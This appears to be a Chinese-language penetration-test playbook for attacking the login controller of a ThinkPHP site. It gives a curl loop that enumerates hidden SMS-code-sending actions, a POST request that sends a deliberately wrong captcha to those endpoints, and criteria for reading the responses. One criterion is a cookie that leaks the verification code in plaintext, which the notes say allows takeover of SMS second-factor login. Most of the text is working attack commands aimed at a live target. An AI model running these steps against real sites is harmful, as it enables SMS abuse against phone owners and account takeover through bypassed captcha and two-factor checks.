# 思路
登录页前端只引用「有图形码」的那条发码接口（/home/api.login/code）。同控制器里通常还留有
历史/内部 action（send_code、sendcode、sendmsg、getcode…），它们常常不做图形码校验。

# ① 存在性枚举：用 404 否定判据把 existence 和 404 分开
#    ThinkPHP debug=off 时不存在动作统一返回 "System Error"（本目标 7584B），可作为否定签名。
#    注意一定要把「下划线变体」和「无下划线变体」都放进去（send_code 与 sendcode 是两个不同 action）。
acts="index login login2 login3 code code2 code3 sendcode send_code sendsms sms mobile phone \
verify check logout out register reg forget pwd reset bind unbind password captcha verifycode \
checkcode islogin info user sendvcode getcode sendmsg notice"
for a in $acts; do
  curl -k -sS -m 12 -o /tmp/a_$a -w "%{http_code}:%{size_download} $a\n" "$BASE/home/api.login/$a"
  sleep 1.5
done
# 非 404 → 该 action 存在；GET 返回 500 → 存在但缺参数（正是发码口特征）

# ② 用同控制器已知接口的字段形态拼最小 body，图形码字段故意填错值
curl -k -sS -D - -o body.txt \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data 'mobile=<TEST_MOBILE>&code=0000&login_type=888' \
  "$BASE/home/api.login/send_code"

# ③ 判据
#    {"code":2003,"msg":"图形验证码错误！"}      → 有图形码，换下一个候选
#    body "0" + 200                          → 短信网关返回成功（已真实下发）
#    body 非 0 数字                            → 网关错误码（如 "2"=号码非法），可用非法号做对照
#    响应头 Set-Cookie: mobile_code=NNNN       → 验证码明文回显，可直接接管短信二次验证
